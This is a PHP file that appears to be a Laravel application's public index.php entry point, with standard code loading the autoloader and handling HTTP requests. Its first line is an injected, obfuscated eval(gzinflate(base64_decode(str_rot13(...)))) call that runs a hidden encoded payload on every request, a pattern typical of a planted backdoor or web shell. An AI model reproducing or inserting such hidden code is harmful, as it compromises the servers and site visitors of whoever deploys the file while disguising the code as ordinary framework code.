<?php
eval(gzinflate(base64_decode(str_rot13('5Iqso9gHSU/Cc7vAbgeJTvsg6NFAbdcf7yVc7GbazEuYfJ7fz/v2wd/kiJzF1K2Uy/R2kQgZDtVWWPGDRUjnhb1ijoa+xmccj8dRrZSFJ9a3/Yh/p87iaUVvYRTUkCYbxNd1dgHXWNkMnVHxLXTt/vQ+5uYfxSNg3zJ+VY4bg6pO2HXPGRGSSHBiMef45RGHE6Wsse8VPtJU9XyCIXIw7vyedTF1QCBELG5EGBAuk2v1Ysa9FNbJ+vCsScG5dR+R7McxlNEW/nvyHruc6XlN4XS9cTnlScyDYevd2POtHM8XEpix5SBlKIEUf0ZIUTIU8HrVyDIt3aoK0A2B2KkjXPAdDdQF4D2RGnCqZD/n5f5On9pj19Q6GMEnenLSVBmgCw40cSVsr5m8Z8KTt1o7dzVcWUmxvrmXMRWfnJQEgB0kGgXQ2LzRqnMselr2HEDuZtmRIOHuUJoa2umT8tzWTVI+byAQyDc68+mavl+rK3m945hsiaa12sZ/saa5+ghKZ5KmjbYvaCKLjZJmK189+/mCS88isitqIS9/9qiS91++/h5SeUzBvNmh7WdY96yUeNSHf52HQypKHcy6mQF2532wesDFvM/PrnRNE7VHT4lYGhvOP8HIVhOoypezvOBz89f6k2JPhFvi63vVamVsw7yhf2UyzSrBXD6bYvMPdFTHglIwinoD55mW/WFttmPRWw8Mif0p4ftLpZBf2b39B83cO5/v1vo9+XBUT/w2tqroou73Adda4X5DFUBnJpllOvMwB2xLCpmWasrf5BBpsB2l4ntaFTvq4yQAn6+u3o1z2mPgEmiAiKf7oHA2m1k1MC3iteDxtWklni5XZuqHSfX7PbrzmoXIA/HhMv7GiG/lEh+D7vTbWqaBT/eoKXrrMX5m+LeIIyqERWXOApFtePdIG550k5UrYKsIegoq7d50g7cChxqUg0bIPr2y4vjQTDo7aJMaDnE2CIdccVXQVXXZE9u3DxnqlTSw32CLvKbr9x+vUuTEwGa1JGGND8XwjZCG6WD6uRHOBlSuSQVzVc+ZrrEttnAl11T3I7dBcvDjm9vrpfZstTgb1OZl1MWb0voy0WijR59NGCpMT3vxk4Qx0HdrbuoxCbEk9Knck9uyoPHigOwLaz97VjpvF6ZP+PPG1nGnFtXVRI7WWCOxEFxEjPoEF6hkm0XPVJhWUBnbqXdq5quJaphftaDDtS+XGPHZEH2oM9wR93cgtHCCP/BpgatSx/EyEsJK4NbatZDtkaHcKVyDQ0O9v8uHVebpHTQyh3Bx/O/Ap1t5qh4oOmNiv/ifXsH8KAaHd0vSyt2jbQ0CEgnfgPbo+abA3MV9Ql0/Ub/1OW24jrSpy3hBIimKS4zTfKAC7tYI/8KJxJhQl50QUKFnGr36krWgH/18lKksZzWhLwLo/a242TkiYGon7HCNU2N3mBVEfQlDlIHOJKAJKUFkmUFLS1SvRLzypcFF/tVWMvJsegiX3Yd9MAgJMgAnmGAKQx9vh2lhPrIx1VioR/z3KgDuGS1MQDyNHSq04PO4T+U6WriPr7+rxpHy9gPml3PBKI5ShMvA1TAh6657FtCo8rZBb75QWaetOfKeu/eP7rFRmWSp7eYMslcAMzCWYSibkzApCX30jgiIhAZuQTag2efvJFO/ND=='))));
use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Check If The Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is in maintenance / demo mode via the "down" command
| we will load this file so that any pre-rendered content can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

/** @var Kernel $kernel */
$kernel = $app->make(Kernel::class);

$response = $kernel->handle(
    $request = Request::capture()
)->send();

$kernel->terminate($request, $response);
